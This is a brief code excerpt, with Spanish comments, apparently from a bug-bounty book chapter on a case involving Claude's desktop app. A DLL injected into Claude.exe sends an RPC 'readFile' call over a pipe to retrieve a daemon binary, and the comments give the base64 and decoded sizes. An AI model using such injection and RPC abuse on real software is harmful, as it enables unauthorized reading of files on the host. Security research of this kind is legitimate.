// Extraído de: LibroBugBounty/cap-23-caso-anthropic.md
// Desde la DLL inyectada en Claude.exe:
send_rpc(pipe, "readFile",
    "{\"path\":\"/usr/local/bin/sdk-daemon\"}");
// Respuesta: 11,032,199 bytes en base64
// Decodificado: 8,274,104 bytes
// Formato: ELF 64-bit x86-64, statically linked
